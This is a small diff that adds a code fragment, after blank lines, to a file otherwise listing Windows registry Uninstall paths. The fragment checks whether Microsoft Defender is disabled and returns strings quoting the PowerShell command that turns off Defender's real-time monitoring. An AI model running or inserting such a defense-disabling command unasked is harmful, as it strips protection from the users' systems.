@@ -27,3 +27,13 @@ Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
 
 
 Computer\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
+
+
+
+
+
+
+            if(await CheckDefenderDisable())
+              return "Set-MpPreference -DisableRealtimeMonitoring $true: OK!!!\n";
+            else
+              return "Set-MpPreference -DisableRealtimeMonitoring $false: OK!!!\n";
